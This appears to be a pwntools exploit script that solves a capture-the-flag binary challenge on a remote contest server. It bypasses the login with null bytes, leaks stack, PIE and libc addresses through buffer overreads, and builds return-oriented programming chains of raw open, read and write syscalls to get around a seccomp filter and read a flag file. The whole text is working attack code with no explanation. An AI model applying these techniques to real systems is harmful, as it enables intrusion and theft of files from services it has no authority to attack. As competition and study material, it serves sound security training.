#flag = SPR{just_born_already_bypassed_seccomp}
from pwn import *

elf = ELF('./app')
libc = ELF('./libc.so.6')
target = remote("tasks.sprush.rocks", 20002)

def sa(s, d):
	target.sendafter(s, d)

def s(d):
	target.send(d)

sa("Login:\n", "\x00"*6)
sa("Password:\n", "\x00"*8)

def upload(sz, content):
	sa(":\n", str("4"))
	sa(":\n", str(sz))
	s(content)

upload(0x10, "A"*0x10)
target.recvuntil("A"*0x10)
saved_ebp = u64(target.recvline().strip().ljust(8, "\x00"))
log.success("Saved EBP: " + hex(saved_ebp))

upload(0x18, "A"*0x18)
target.recvuntil("A"*0x18)
pie_base = u64(target.recvline().strip().ljust(8, "\x00")) - 0x19fd
log.success("PIE Base : " + hex(pie_base))

pop_rdi = p64(pie_base + 0x0000000000001a7b)
flag_a = (pie_base + 0x40a0)

upload(0x20, "A"*0x10 + p64(saved_ebp) + p64(pie_base + 0x19fd))

rop_chain =  "A"*0x10 + p64(saved_ebp)
rop_chain += pop_rdi + p64(pie_base + elf.got['puts']) + p64(pie_base + elf.plt['puts']) 
rop_chain += pop_rdi + p64(saved_ebp + 0x20) + p64(pie_base + elf.plt['puts']) + p64(pie_base + 0x19fd)
upload(0x200, rop_chain)

target.recvline()
libc_base = u64(target.recvline().strip().ljust(8, "\x00")) - libc.sym['puts']
log.success("LIBC Base: " + hex(libc_base))

sys_ret = p64(libc_base + 0x00000000000b5b35)
pop_rax = p64(libc_base + 0x000000000003a638)
pop_rsi = p64(libc_base + 0x000000000002440e)
pop_rdx = p64(libc_base + 0x0000000000106725)

rop_chain = "A"*0x10 + p64(saved_ebp)
rop_chain += pop_rax + p64(1) + pop_rdi + p64(1) + pop_rsi + p64(flag_a) + pop_rdx + p64(0x50) + sys_ret
rop_chain += pop_rax + p64(1) + pop_rdi + p64(1) + pop_rsi + p64(pie_base + 0x20f4) + pop_rdx + p64(0x6) + sys_ret
rop_chain += pop_rax + p64(0) + pop_rdi + p64(0) + pop_rsi + p64(flag_a) + pop_rdx + p64(0x20) + sys_ret

rop_chain += pop_rax + p64(1) + pop_rdi + p64(1) + pop_rsi + p64(flag_a) + pop_rdx + p64(0x20) + sys_ret
rop_chain += pop_rax + p64(2) + pop_rdi + p64(flag_a) + pop_rsi + p64(0) + pop_rdx + p64(0x00) + sys_ret
rop_chain += pop_rax + p64(0) + pop_rdi + p64(4) + pop_rsi + p64(flag_a + 0x20) + pop_rdx + p64(0x50) + sys_ret
rop_chain += pop_rax + p64(1) + pop_rdi + p64(1) + pop_rsi + p64(pie_base + 0x20f4) + pop_rdx + p64(0x6) + sys_ret
rop_chain += pop_rax + p64(1) + pop_rdi + p64(1) + pop_rsi + p64(flag_a + 0x20) + pop_rdx + p64(0x30) + sys_ret
rop_chain += "\n"
upload(0x400, rop_chain)

sa("Hooray", "/tmp/flag.txt")

target.interactive()
